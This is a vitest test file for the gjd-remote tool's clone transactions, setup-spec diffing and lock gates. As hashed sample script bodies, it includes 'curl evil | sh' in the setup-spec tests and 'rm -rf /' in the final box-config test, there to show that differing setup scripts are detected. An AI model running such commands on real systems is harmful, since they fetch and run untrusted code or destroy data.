/**
 * The decisions `gjd-remote` makes about clones, configs and setup runs.
 *
 * Every test here exists because GPT Sol's Stage 2 review
 * (docs/plans/260902h-…-stage2-review-sol.md) found the code it covers
 * unreachable from any test: `cloneIntoPlace`, `sweepStaging`,
 * `authoritativeConfig`, `setupGate` and the box-read protocol all lived in
 * `scripts/gjd-remote.ts`, which calls `main()` on import. They are in
 * `scripts/gjd-remote-flow.ts` now, and this file is the reddening.
 *
 * **The shell is RUN, not read.** `checkoutProbeScript` and
 * `cloneTransactionScript` are executed under this laptop's bash, against real
 * temporary git repositories, exactly as the box would run them. Asserting on
 * the text of a generated script proves the text; running it proves the script.
 *
 * `flock` is not on macOS, and the transaction refuses without it — correctly,
 * because there is no serialising to be had. So these tests put a **fake
 * `flock` on PATH**: one that grants and one that refuses. What is under test
 * is which branch we take on the lock's answer, not the kernel's locking, and
 * a fake makes the "another clone is running" branch reachable at all.
 */
import { execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { parseRepoConfig } from "../scripts/gjd-remote-config.js";
import {
  BOX_END,
  BOX_ERR,
  BOX_OK,
  type LockState,
  type SetupSpec,
  boxConfigScript,
  checkoutProbeScript,
  cloneTransactionScript,
  decodeBoxField,
  describeSpec,
  diffSetupSpec,
  foundGateDecision,
  isStagingBasename,
  needsTerminalSetupRecord,
  parseBoxRead,
  parseBoxConfig,
  parseCheckoutProbe,
  parseCloneTransaction,
  setupGateDecision,
  setupSpec,
  sha256,
} from "../scripts/gjd-remote-flow.js";
import type { SetupVerdict } from "../scripts/gjd-remote-setup.js";

// ------------------------------------------------------------------ fixtures

let root: string;

function git(cwd: string, ...args: string[]): string {
  return execFileSync("git", args, {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    env: {
      ...process.env,
      GIT_CONFIG_GLOBAL: join(root, "gitconfig"),
      GIT_CONFIG_SYSTEM: "/dev/null",
      GIT_AUTHOR_NAME: "T",
      GIT_AUTHOR_EMAIL: "t@example.com",
      GIT_COMMITTER_NAME: "T",
      GIT_COMMITTER_EMAIL: "t@example.com",
    },
  });
}

/** A repo with one commit, at `<root>/<where>`, and its origin if given. */
function makeRepo(where: string, origin?: string): string {
  const dir = join(root, where);
  mkdirSync(dir, { recursive: true });
  git(dir, "init", "-q", "-b", "main");
  writeFileSync(join(dir, "README.md"), "hello\n");
  git(dir, "add", "README.md");
  git(dir, "commit", "-qm", "first");
  if (origin) git(dir, "remote", "add", "origin", origin);
  return dir;
}

/**
 * A `flock` on PATH that always grants (`grant`) or always refuses (`busy`).
 * Returned as the PATH prefix to run the script with.
 */
function fakeFlock(kind: "grant" | "busy"): string {
  const bin = join(root, `bin-${kind}`);
  mkdirSync(bin, { recursive: true });
  const file = join(bin, "flock");
  writeFileSync(file, `#!/bin/sh\nexit ${kind === "grant" ? 0 : 1}\n`);
  chmodSync(file, 0o755);
  return bin;
}

/** Run a generated box script under bash, the way the box would. */
function run(script: string, opts: { path?: string } = {}): string {
  return execFileSync("bash", ["-c", script], {
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
    env: {
      ...process.env,
      ...(opts.path === undefined ? {} : { PATH: `${opts.path}:${process.env.PATH ?? ""}` }),
      GIT_CONFIG_GLOBAL: join(root, "gitconfig"),
      GIT_CONFIG_SYSTEM: "/dev/null",
      GIT_AUTHOR_NAME: "T",
      GIT_AUTHOR_EMAIL: "t@example.com",
      GIT_COMMITTER_NAME: "T",
      GIT_COMMITTER_EMAIL: "t@example.com",
    },
  });
}

beforeEach(() => {
  // realpathSync because /tmp is a symlink to /private/tmp on macOS, and the
  // scripts compare `pwd -P` against what git reports.
  root = realpathSync(mkdtempSync(join(tmpdir(), "gjd-remote-flow-")));
  writeFileSync(join(root, "gitconfig"), "[init]\n\tdefaultBranch = main\n");
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

// ------------------------------------------------------- the box-read protocol

describe("parseBoxRead", () => {
  const whole = [BOX_OK, "a 1", "b two words", BOX_END, ""].join("\n");

  it("reads a whole reply", () => {
    const got = parseBoxRead(whole, ["a", "b"]);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.fields.get("a")).toBe("1");
    expect(got.fields.get("b")).toBe("two words");
  });

  /**
   * GPT Sol's Stage 2 finding 5, and the reason `BOX_END` exists at all: a
   * reply cut after its last field is byte-for-byte a complete one. Without the
   * terminal sentinel this input parses, and every field in it is right.
   */
  it("refuses a reply cut off after its last field", () => {
    const cut = [BOX_OK, "a 1", "b two words"].join("\n");
    const got = parseBoxRead(cut, ["a", "b"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("cut short");
  });

  it("refuses anything after the end sentinel", () => {
    const got = parseBoxRead(`${whole}\nb three\n`, ["a", "b"]);
    expect(got.ok).toBe(false);
  });

  it("refuses a field said twice, rather than choosing one", () => {
    const got = parseBoxRead([BOX_OK, "a 1", "a 2", "b x", BOX_END].join("\n"), ["a", "b"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("two 'a' lines");
  });

  it("refuses a line nobody asked for", () => {
    const got = parseBoxRead([BOX_OK, "a 1", "b x", "c surprise", BOX_END].join("\n"), ["a", "b"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("'c'");
  });

  it("refuses a missing field by name", () => {
    const got = parseBoxRead([BOX_OK, "a 1", BOX_END].join("\n"), ["a", "b"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("b");
  });

  it("hands back the box's own refusal, wherever it appears", () => {
    const got = parseBoxRead([BOX_OK, "a 1", `${BOX_ERR} git is not on this box`].join("\n"), ["a"]);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toBe("git is not on this box");
  });

  it("refuses a reply that never started", () => {
    expect(parseBoxRead("bash: something went wrong\n", ["a"]).ok).toBe(false);
  });
});

describe("decodeBoxField", () => {
  it("round-trips text", () => {
    const b64 = Buffer.from("a path with spaces/and-a-|", "utf8").toString("base64");
    const got = decodeBoxField(b64, "x");
    expect(got.ok && got.text).toBe("a path with spaces/and-a-|");
  });

  it("refuses base64 that was cut in half", () => {
    const b64 = Buffer.from("a reasonably long value here", "utf8").toString("base64");
    expect(decodeBoxField(b64.slice(0, -6), "x").ok).toBe(false);
  });
});

// -------------------------------------------------------------- checkout probe

describe("checkoutProbeScript, run for real", () => {
  it("reads a checkout: origin, HEAD, branch, subject and the .git inode", () => {
    const dir = makeRepo("repo", "https://github.com/gregdetre/gjdutils.git");
    const got = parseCheckoutProbe(run(checkoutProbeScript(dir)));
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.probe.exists).toBe(true);
    expect(got.probe.isCheckout).toBe(true);
    expect(got.probe.isSymlink).toBe(false);
    expect(got.probe.origin).toBe("https://github.com/gregdetre/gjdutils.git");
    expect(got.probe.head).toMatch(/^[0-9a-f]{40}$/);
    expect(got.probe.branch).toBe("main");
    expect(got.probe.subject).toBe("first");
    expect(got.probe.gitInode).toMatch(/^[0-9]+$/);
  });

  it("says a plain directory is not a checkout, and has no inode", () => {
    mkdirSync(join(root, "plain"));
    const got = parseCheckoutProbe(run(checkoutProbeScript(join(root, "plain"))));
    expect(got.ok && got.probe.exists).toBe(true);
    expect(got.ok && got.probe.isCheckout).toBe(false);
    expect(got.ok && got.probe.gitInode).toBeUndefined();
  });

  it("says a missing path does not exist", () => {
    const got = parseCheckoutProbe(run(checkoutProbeScript(join(root, "nope"))));
    expect(got.ok && got.probe.exists).toBe(false);
  });

  it("reports a symlink as one, even when it points at a checkout", () => {
    const real = makeRepo("target", "https://github.com/gregdetre/gjdutils.git");
    symlinkSync(real, join(root, "link"));
    const got = parseCheckoutProbe(run(checkoutProbeScript(join(root, "link"))));
    expect(got.ok && got.probe.isSymlink).toBe(true);
    expect(got.ok && got.probe.exists).toBe(true);
  });

  /** An interrupted clone: a `.git` with no commit. It is a checkout and it has
   *  no HEAD, and that difference is the whole of `blocked: incomplete-checkout`. */
  it("reports a checkout whose HEAD does not resolve", () => {
    const dir = join(root, "half");
    mkdirSync(dir, { recursive: true });
    git(dir, "init", "-q", "-b", "main");
    const got = parseCheckoutProbe(run(checkoutProbeScript(dir)));
    expect(got.ok && got.probe.isCheckout).toBe(true);
    expect(got.ok && got.probe.head).toBeUndefined();
  });

  it("survives a directory name with a space and a pipe in it", () => {
    const dir = makeRepo("odd name|here", "https://github.com/gregdetre/gjdutils.git");
    const got = parseCheckoutProbe(run(checkoutProbeScript(dir)));
    expect(got.ok && got.probe.realpath).toBe(dir);
  });
});

// ---------------------------------------------------------- clone transaction

describe("cloneTransactionScript, run for real", () => {
  /** A bare repo to clone from, and the `file://` URL git will record. */
  function upstream(): { url: string } {
    const src = makeRepo("upstream-work");
    const bare = join(root, "upstream.git");
    execFileSync("git", ["clone", "-q", "--bare", src, bare], { stdio: ["ignore", "pipe", "pipe"] });
    return { url: `file://${bare}` };
  }

  function transaction(o: { dest: string; staging: string; url: string; statusPath?: string }): string {
    return cloneTransactionScript({
      dest: o.dest,
      staging: o.staging,
      lockPath: join(root, "locks", "clone-x.lock"),
      locksDir: join(root, "locks"),
      url: o.url,
      statusPath: o.statusPath ?? join(root, "setup", "owner--name.json"),
    });
  }

  it("clones, verifies and moves into place, and reports the new .git inode", () => {
    const { url } = upstream();
    const dest = join(root, "code", "thing");
    const out = run(transaction({ dest, staging: join(root, "code", ".gjd-remote-staging-thing-1"), url }), {
      path: fakeFlock("grant"),
    });
    const got = parseCloneTransaction(out);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.outcome.kind).toBe("ok");
    if (got.outcome.kind !== "ok") return;
    expect(got.outcome.origin).toBe(url);
    expect(got.outcome.head).toMatch(/^[0-9a-f]{40}$/);
    expect(got.outcome.stale).toBe("none");
    // The destination IS the tree that was verified, not merely a tree.
    const after = parseCheckoutProbe(run(checkoutProbeScript(dest)));
    expect(after.ok && after.probe.gitInode).toBe(got.outcome.inode);
  });

  /**
   * GPT Sol's Stage 2 finding 1. The old code asked the box whether the
   * destination existed, and moved into it several seconds later.
   */
  it("refuses when the destination appeared while we were not looking", () => {
    const { url } = upstream();
    const dest = join(root, "code", "thing");
    mkdirSync(dest, { recursive: true });
    writeFileSync(join(dest, "somebody-elses-work.txt"), "mine\n");
    const got = parseCloneTransaction(
      run(transaction({ dest, staging: join(root, "code", ".gjd-remote-staging-thing-2"), url }), { path: fakeFlock("grant") }),
    );
    expect(got.ok && got.outcome.kind).toBe("taken");
    expect(execFileSync("cat", [join(dest, "somebody-elses-work.txt")], { encoding: "utf8" })).toBe("mine\n");
  });

  /**
   * GPT Sol's Stage 2 finding 2, and the one that matters most: the old
   * `sweepStaging` would `rm -rf` a directory it had not created, because its
   * only guard was the pathname. Reserving the name with `mkdir` makes that
   * unreachable — the transaction never gets past the reservation.
   */
  it("never touches a directory it did not create at the staging name", () => {
    const { url } = upstream();
    const staging = join(root, "code", ".gjd-remote-staging-thing-3");
    mkdirSync(staging, { recursive: true });
    writeFileSync(join(staging, "precious.txt"), "not ours\n");
    const got = parseCloneTransaction(
      run(transaction({ dest: join(root, "code", "thing"), staging, url }), { path: fakeFlock("grant") }),
    );
    expect(got.ok && got.outcome.kind).toBe("staging-taken");
    expect(execFileSync("cat", [join(staging, "precious.txt")], { encoding: "utf8" })).toBe("not ours\n");
  });

  it("sweeps only the empty directory it reserved when git fails", () => {
    const staging = join(root, "code", ".gjd-remote-staging-thing-4");
    const got = parseCloneTransaction(
      run(transaction({ dest: join(root, "code", "thing"), staging, url: `file://${join(root, "no-such-repo.git")}` }), {
        path: fakeFlock("grant"),
      }),
    );
    expect(got.ok).toBe(true);
    if (!got.ok || got.outcome.kind !== "clone-failed") throw new Error(`got ${JSON.stringify(got)}`);
    expect(got.outcome.swept).toBe("removed");
    expect(got.outcome.code).not.toBe("0");
  });

  it("says a refusal is a refusal, so nothing is sent to look at paths that were never made", () => {
    const got = parseCloneTransaction(`${BOX_ERR} another clone of that destination is running on the box right now\n`);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.refused).toBe(true);
    // A reply that started and stopped is NOT a refusal: something may have
    // happened, and the caller has to name both paths.
    const cut = parseCloneTransaction([BOX_OK, "step ok", "inode 12"].join("\n"));
    expect(cut.ok === false && cut.refused).toBe(false);
  });

  it("refuses outright when another clone holds the lock", () => {
    const { url } = upstream();
    const got = parseCloneTransaction(
      run(transaction({ dest: join(root, "code", "thing"), staging: join(root, "code", ".gjd-remote-staging-thing-5"), url }), {
        path: fakeFlock("busy"),
      }),
    );
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("another clone");
  });

  /**
   * GPT Sol's Stage 2 finding 7, the CLI half: delete a checkout, clone it
   * again at the same path, and the old success still names that slug and that
   * directory. It is archived rather than deleted — it is the only record of
   * what was there.
   */
  it("archives a setup status left over from the checkout that used to be here", () => {
    const { url } = upstream();
    const statusPath = join(root, "setup", "owner--name.json");
    mkdirSync(join(root, "setup"), { recursive: true });
    writeFileSync(statusPath, '{"outcome":"success"}\n');
    const got = parseCloneTransaction(
      run(
        transaction({
          dest: join(root, "code", "thing"),
          staging: join(root, "code", ".gjd-remote-staging-thing-6"),
          url,
          statusPath,
        }),
        { path: fakeFlock("grant") },
      ),
    );
    expect(got.ok && got.outcome.kind === "ok" && got.outcome.stale).toBe("archived");
    expect(() => execFileSync("cat", [statusPath], { stdio: ["ignore", "pipe", "pipe"] })).toThrow();
  });

  /**
   * The clone exits 0 and what it made has no commit — an empty upstream here,
   * an interrupted clone on the box. Verified BEFORE the move, so the
   * destination never exists at all rather than existing half-made.
   */
  it("refuses to move a tree whose HEAD does not resolve, and leaves no destination", () => {
    const empty = join(root, "empty.git");
    execFileSync("git", ["init", "-q", "--bare", "-b", "main", empty], { stdio: ["ignore", "pipe", "pipe"] });
    const dest = join(root, "code", "thing");
    const got = parseCloneTransaction(
      run(
        transaction({ dest, staging: join(root, "code", ".gjd-remote-staging-thing-7"), url: `file://${empty}` }),
        { path: fakeFlock("grant") },
      ),
    );
    expect(got.ok).toBe(true);
    if (!got.ok || got.outcome.kind !== "verify-failed") throw new Error(`got ${JSON.stringify(got)}`);
    expect(got.outcome.why).toBe("no-head");
    const at = parseCheckoutProbe(run(checkoutProbeScript(dest)));
    expect(at.ok && at.probe.exists).toBe(false);
  });
});

describe("parseCloneTransaction", () => {
  it("refuses a reply that stops after the step line", () => {
    const got = parseCloneTransaction([BOX_OK, "step ok", "inode 12"].join("\n"));
    expect(got.ok).toBe(false);
  });

  it("refuses a step it does not know", () => {
    const got = parseCloneTransaction([BOX_OK, "step teleported", BOX_END].join("\n"));
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("teleported");
  });
});

describe("isStagingBasename", () => {
  it("accepts a staging directory", () => {
    expect(isStagingBasename("/home/greg/code/.gjd-remote-staging-x-1234")).toBe(true);
  });

  /** The guard this replaces was a shell `case` over the whole path, so an
   *  innocent child of a staging directory matched it — and the one `rm -rf` in
   *  the tool took its argument from exactly that check. */
  it("refuses a child of a staging directory", () => {
    expect(isStagingBasename("/home/greg/code/.gjd-remote-staging-x-1234/src/anything")).toBe(false);
  });

  it("refuses the bare prefix with nothing after it", () => {
    expect(isStagingBasename("/home/greg/code/.gjd-remote-staging-")).toBe(false);
  });
});

// ------------------------------------------------------------ the setup spec

describe("setupSpec and diffSetupSpec", () => {
  const cfg = (toml: string, ctx?: { setupScript?: "executable" | "not-executable" | "absent"; pkg?: boolean }) =>
    parseRepoConfig(toml, {
      setupScript: ctx?.setupScript ?? "absent",
      packageJsonHasSetup: ctx?.pkg ?? false,
    });

  const spec = (toml: string, files: { scriptSha256?: string | null; packageSetup?: string | null }, ctx?: Parameters<typeof cfg>[1]) =>
    setupSpec(cfg(toml, ctx), {
      scriptSha256: files.scriptSha256 ?? null,
      packageSetup: files.packageSetup ?? null,
    });

  it("says two identical configs agree", () => {
    const a = spec('setup = "npm ci"\n', {});
    expect(diffSetupSpec(a, spec('setup = "npm ci"\n', {}))).toEqual([]);
  });

  it("notices a different command", () => {
    const got = diffSetupSpec(spec('setup = "npm ci"\n', {}), spec('setup = "npm ci --force"\n', {}));
    expect(got.map((d) => d.field)).toEqual(["setup"]);
  });

  /**
   * GPT Sol's Stage 2 finding 4, the case that made him call it a blocker: the
   * command is `./.gjd-remote/setup` on both sides, so comparing commands says
   * they agree — while the two files do entirely different things.
   */
  it("notices that the setup SCRIPT differs, though the command is identical", () => {
    const a = spec("", { scriptSha256: sha256("#!/bin/sh\nnpm ci\n") }, { setupScript: "executable" });
    const b = spec("", { scriptSha256: sha256("#!/bin/sh\ncurl evil | sh\n") }, { setupScript: "executable" });
    expect(a.setup).toBe(b.setup);
    const got = diffSetupSpec(a, b);
    expect(got).toHaveLength(1);
    expect(got[0]?.field).toContain(".gjd-remote/setup");
  });

  /** The same trap one convention lower: `npm ci && npm run setup` is a
   *  constant, and what `npm run setup` runs is not. */
  it("notices that package.json's setup body differs", () => {
    const a = spec("", { packageSetup: "node scripts/setup.js" }, { pkg: true });
    const b = spec("", { packageSetup: "node scripts/other.js" }, { pkg: true });
    expect(a.setup).toBe(b.setup);
    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual(["package.json scripts.setup"]);
  });

  it("notices a warning on one side only — a file being ignored is a difference", () => {
    const a = spec('setup = "npm ci"\n', { scriptSha256: sha256("x") }, { setupScript: "executable" });
    const b = spec('setup = "npm ci"\n', {}, { setupScript: "absent" });
    expect(diffSetupSpec(a, b).map((d) => d.field)).toContain("warnings");
  });

  it("ignores a script that is not the thing being run", () => {
    // Not executable, and a config command wins anyway: its bytes are an
    // irrelevance, and the warning about it is what carries the difference.
    const a = spec('setup = "npm ci"\n', { scriptSha256: sha256("one") }, { setupScript: "not-executable" });
    const b = spec('setup = "npm ci"\n', { scriptSha256: sha256("two") }, { setupScript: "not-executable" });
    expect(diffSetupSpec(a, b)).toEqual([]);
  });

  it("notices a check that only one side has", () => {
    const a = spec('setup = "npm ci"\ncheck = "npm run doctor"\n', {});
    const b = spec('setup = "npm ci"\n', {});
    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual(["check"]);
  });

  it("describes what would run, with the script's hash when that is what runs", () => {
    const s = spec("", { scriptSha256: sha256("#!/bin/sh\n") }, { setupScript: "executable" });
    expect(describeSpec(s)).toContain("script");
    expect(describeSpec(s)).toContain("sha ");
    expect(describeSpec(spec("", {}))).toBe("(none known)");
  });
});

// ------------------------------------------------------------------ the gates

const verdicts: Record<string, SetupVerdict> = {
  "never-run": { kind: "never-run", why: "nothing has ever set it up", remedy: "gjd-remote setup" },
  "config-changed": { kind: "config-changed", why: "the config changed", remedy: "gjd-remote setup" },
  failed: { kind: "failed", why: "it failed", remedy: "gjd-remote setup", exitCode: 3, checkFailed: false },
  "in-progress": {
    kind: "in-progress",
    why: "a setup attempt started",
    remedy: "gjd-remote ls",
    attempt: "a1",
    startedAt: "2026-09-02T00:00:00Z",
  },
  success: { kind: "success", why: "set up on attempt a1", remedy: null },
  "wrong-checkout": {
    kind: "wrong-checkout",
    why: "that status is about another checkout",
    remedy: "gjd-remote setup",
    field: "inode",
    found: "1",
    wanted: "2",
  },
};

describe("setupGateDecision", () => {
  const decide = (v: string, lock: LockState, force = false) =>
    setupGateDecision(verdicts[v] as SetupVerdict, lock, force).kind;

  it("starts a run for every not-ready verdict when the lock is free", () => {
    for (const v of ["never-run", "config-changed", "failed", "wrong-checkout"]) {
      expect(decide(v, "free")).toBe("start");
      expect(decide(v, "none")).toBe("start");
    }
  });

  it("calls a success already ready, and runs it again only for --force", () => {
    expect(decide("success", "free")).toBe("already-ready");
    expect(decide("success", "free", true)).toBe("start");
  });

  it("refuses an in-progress attempt, and --force is what overrides a dead one", () => {
    expect(decide("in-progress", "free")).toBe("refuse");
    expect(decide("in-progress", "free", true)).toBe("start");
  });

  it("refuses everything while the lock is held, --force included", () => {
    for (const v of Object.keys(verdicts)) {
      expect(decide(v, "held")).toBe("refuse");
      expect(decide(v, "held", true)).toBe("refuse");
    }
  });

  /**
   * GPT Sol's Stage 2 finding 9. Every `noflock` cell used to START a job,
   * which then died with exit 78 inside a pane that vanished — a refusal
   * wearing a green tick. There is no lock to be had, and running without one
   * is the concurrency the design exists to prevent.
   */
  it("refuses every run when the box has no flock, including a forced one", () => {
    for (const v of Object.keys(verdicts)) {
      expect(decide(v, "noflock")).toBe("refuse");
      expect(decide(v, "noflock", true)).toBe("refuse");
    }
    const r = setupGateDecision(verdicts.success as SetupVerdict, "noflock", true);
    expect(r.kind === "refuse" && r.why).toContain("flock is not installed");
  });
});

describe("foundGateDecision", () => {
  it("lets a success through in silence", () => {
    expect(foundGateDecision(verdicts.success as SetupVerdict, "free")).toEqual({ kind: "go" });
  });

  it("warns and proceeds for never-run, failed and config-changed", () => {
    for (const v of ["never-run", "failed", "config-changed"]) {
      expect(foundGateDecision(verdicts[v] as SetupVerdict, "free").kind).toBe("warn");
    }
  });

  it("refuses only while a setup actually holds the lock", () => {
    expect(foundGateDecision(verdicts["in-progress"] as SetupVerdict, "free").kind).toBe("warn");
    expect(foundGateDecision(verdicts["in-progress"] as SetupVerdict, "held").kind).toBe("refuse");
  });

  /** Sol's finding 7: a status about another tree is worse than no status,
   *  because it is evidence pointing somewhere else. */
  it("refuses a status that is about a different checkout", () => {
    const got = foundGateDecision(verdicts["wrong-checkout"] as SetupVerdict, "free");
    expect(got.kind).toBe("refuse");
    if (got.kind !== "refuse") return;
    expect(got.why).toContain("gjd-remote setup");
  });
});

// --------------------------------------------------------------- the log's end

describe("needsTerminalSetupRecord", () => {
  const started = { cmd: "setup", attempt: "a1", outcome: "started" };

  it("owes a record when only a start was written", () => {
    expect(needsTerminalSetupRecord([started], "a1")).toBe(true);
  });

  it("owes nothing once the outcome is in", () => {
    expect(needsTerminalSetupRecord([started, { cmd: "setup", attempt: "a1", outcome: "success" }], "a1")).toBe(false);
    expect(needsTerminalSetupRecord([started, { cmd: "setup", attempt: "a1", outcome: "failed" }], "a1")).toBe(false);
  });

  it("owes nothing for an attempt this laptop never started", () => {
    expect(needsTerminalSetupRecord([started], "a2")).toBe(false);
    expect(needsTerminalSetupRecord([], "a1")).toBe(false);
  });

  it("ignores records of other commands that happen to carry an attempt", () => {
    expect(needsTerminalSetupRecord([{ cmd: "new-shell", attempt: "a1", outcome: "started" }], "a1")).toBe(false);
  });
});

// A spec is a plain object; this keeps the type imported and asserts the shape
// the CLI depends on when it prints one.
const _shape: SetupSpec = {
  setup: null,
  source: "none",
  check: null,
  warnings: [],
  scriptSha256: null,
  packageSetup: null,
};
void _shape;

// ------------------------------------------------- a repo's config, on the box

describe("boxConfigScript, run for real", () => {
  const CONFIG_DIR = ".gjd-remote";
  const CONFIG_FILE = ".gjd-remote/config.toml";
  const SETUP_SCRIPT = ".gjd-remote/setup";

  const probe = (dir: string) =>
    parseBoxConfig(
      run(boxConfigScript({ dir, configDir: CONFIG_DIR, configFile: CONFIG_FILE, setupScript: SETUP_SCRIPT })),
      dir,
    );

  function checkout(where: string, files: Record<string, string>, exec: string[] = []): string {
    const dir = join(root, where);
    mkdirSync(join(dir, CONFIG_DIR), { recursive: true });
    for (const [name, body] of Object.entries(files)) writeFileSync(join(dir, name), body);
    for (const name of exec) chmodSync(join(dir, name), 0o755);
    return dir;
  }

  it("reads a config, an executable setup script and its hash", () => {
    const body = "#!/bin/sh\nnpm ci\n";
    const dir = checkout("repo", { [CONFIG_FILE]: 'setup = "./x"\n', [SETUP_SCRIPT]: body }, [SETUP_SCRIPT]);
    const got = probe(dir);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.fields.setupScript).toBe("executable");
    expect(got.fields.scriptSha256).toBe(sha256(body));
    expect(got.fields.configText).toBe('setup = "./x"\n');
    expect(got.fields.packageJsonHasSetup).toBe(false);
    expect(got.fields.packageSetup).toBeNull();
  });

  it("notices a setup script that is not executable", () => {
    const dir = checkout("repo", { [SETUP_SCRIPT]: "#!/bin/sh\n" });
    expect(probe(dir).ok && probe(dir).ok).toBe(true);
    const got = probe(dir);
    expect(got.ok && got.fields.setupScript).toBe("not-executable");
  });

  it("carries package.json's setup body, not just the fact of it", () => {
    const dir = checkout("repo", { "package.json": JSON.stringify({ scripts: { setup: "node scripts/setup.js" } }) });
    const got = probe(dir);
    expect(got.ok && got.fields.packageJsonHasSetup).toBe(true);
    expect(got.ok && got.fields.packageSetup).toBe("node scripts/setup.js");
  });

  /**
   * The bug this protocol had when it lived in `gjd-remote.ts`, where nothing
   * could reach it: the probe printed the base64 of the setup script's body,
   * and "there is no setup script" and "the probe failed" were both the empty
   * string — so an ordinary `package.json` came back as unparseable and every
   * `gjd-remote setup` in that repo refused.
   */
  it("says a package.json with no setup script has none, rather than failing to read it", () => {
    const dir = checkout("repo", { "package.json": JSON.stringify({ name: "x", scripts: { test: "vitest" } }) });
    const got = probe(dir);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    expect(got.fields.packageJsonHasSetup).toBe(false);
    expect(got.fields.packageSetup).toBeNull();
  });

  it("says a package.json with no scripts at all has none", () => {
    const dir = checkout("repo", { "package.json": JSON.stringify({ name: "x" }) });
    expect(probe(dir).ok).toBe(true);
    const got = probe(dir);
    expect(got.ok && got.fields.packageJsonHasSetup).toBe(false);
  });

  it("refuses a package.json it cannot parse, rather than calling it setup-less", () => {
    const dir = checkout("repo", { "package.json": "{ not json" });
    const got = probe(dir);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("not valid JSON");
  });

  it("refuses a directory it cannot enter", () => {
    const got = probe(join(root, "nope"));
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("cannot enter");
  });

  it("refuses a .gjd-remote that is a file", () => {
    const dir = join(root, "odd");
    mkdirSync(dir, { recursive: true });
    writeFileSync(join(dir, CONFIG_DIR), "not a directory\n");
    const got = probe(dir);
    expect(got.ok).toBe(false);
    if (got.ok) return;
    expect(got.why).toContain("not a directory");
  });

  it("carries a config with a newline and a quote in it, intact", () => {
    const toml = 'setup = "echo \'one\' && echo two"\n# a comment\n';
    const dir = checkout("repo", { [CONFIG_FILE]: toml });
    expect(probe(dir).ok && probe(dir).ok).toBe(true);
    const got = probe(dir);
    expect(got.ok && got.fields.configText).toBe(toml);
  });

  /** The whole point of the specification: what the box says and what the
   *  laptop says are compared field by field, and this is the box's half. */
  it("feeds a specification that differs from the laptop's only where the files do", () => {
    const dir = checkout("repo", { [SETUP_SCRIPT]: "#!/bin/sh\nnpm ci\n" }, [SETUP_SCRIPT]);
    const got = probe(dir);
    expect(got.ok).toBe(true);
    if (!got.ok) return;
    const boxSpec = setupSpec(
      parseRepoConfig(got.fields.configText, {
        setupScript: got.fields.setupScript,
        packageJsonHasSetup: got.fields.packageJsonHasSetup,
      }),
      { scriptSha256: got.fields.scriptSha256, packageSetup: got.fields.packageSetup },
    );
    const laptopSame = setupSpec(parseRepoConfig("", { setupScript: "executable", packageJsonHasSetup: false }), {
      scriptSha256: sha256("#!/bin/sh\nnpm ci\n"),
      packageSetup: null,
    });
    expect(diffSetupSpec(boxSpec, laptopSame)).toEqual([]);
    const laptopOther = setupSpec(parseRepoConfig("", { setupScript: "executable", packageJsonHasSetup: false }), {
      scriptSha256: sha256("#!/bin/sh\nrm -rf /\n"),
      packageSetup: null,
    });
    expect(diffSetupSpec(boxSpec, laptopOther)).toHaveLength(1);
  });
});
